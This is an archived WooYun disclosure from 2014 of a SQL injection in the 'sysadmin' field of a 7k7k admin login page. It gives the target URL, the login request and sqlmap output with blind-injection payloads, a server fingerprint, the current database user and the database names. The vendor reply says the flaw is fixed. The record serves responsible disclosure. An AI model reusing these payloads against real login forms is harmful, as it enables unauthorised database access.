wybug_title: 奇客星空某管理系统登录页POST注入
wybug_detail: 漏洞详情 披露状态：   									2014-03-04：	细节已通知厂商并且等待厂商处理中									2014-03-04：	厂商已经确认，细节仅向厂商公开									2014-03-14：	细节向核心白帽子及相关领域专家公开									2014-03-24：	细节向普通白帽子公开									2014-04-03：	细节向实习白帽子公开									2014-04-18：	细节向公众公开  简要描述：  详细说明：  奇客创想系统管理中心：http://madmin.7k7k.com/sys/login.php?cmd=form登录数据包：sysadmin=admin&passwd=admin&checkcode=admin&language=zh_CN&Lang=zh_CNsysadmin存在注入如上   漏洞证明：  sqlmap identified the following injection points with a total of 527 HTTP(s) requests:---Place: POSTParameter: sysadmin    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sysadmin=admin'||(SELECT 'WwYU' FROM DUAL WHERE 9730=9730 AND 9510=9510 )||'&passwd=admin&checkcode=admin&language=zh_CN&Lang=zh_CN    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: sysadmin=admin'||(SELECT 'Gadt' FROM DUAL WHERE 4334=4334 AND 5100=BENCHMARK(5000000,MD5(0x55706866)) )||'&passwd=admin&checkcode=admin&language=zh_CN&Lang=zh_CN---web server operating system: Linux CentOS 5.8web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL >= 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: sysadmin    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sysadmin=admin'||(SELECT 'WwYU' FROM DUAL WHERE 9730=9730 AND 9510=9510 )||'&passwd=admin&checkcode=admin&language=zh_CN&Lang=zh_CN---web server operating system: Linux CentOS 5.8web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5current user:    'vpopmail@localhost'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: sysadmin    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sysadmin=admin'||(SELECT 'WwYU' FROM DUAL WHERE 9730=9730 AND 9510=9510 )||'&passwd=admin&checkcode=admin&language=zh_CN&Lang=zh_CN---web server operating system: Linux CentOS 5.8web application technology: Apache 2.2.3, PHP 5.1.6back-end DBMS: MySQL 5available databases [2]:[*] information_schema[*] vpopmail   修复方案：  有没有礼物呀？   版权声明：转载请注明来源 Neeke@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-03-04 13:17 厂商回复： 感谢白帽作者反馈，确实有此漏洞，已修复，之后联系作者发送小礼物,希望和白帽人员进行合作 最新状态： 暂无
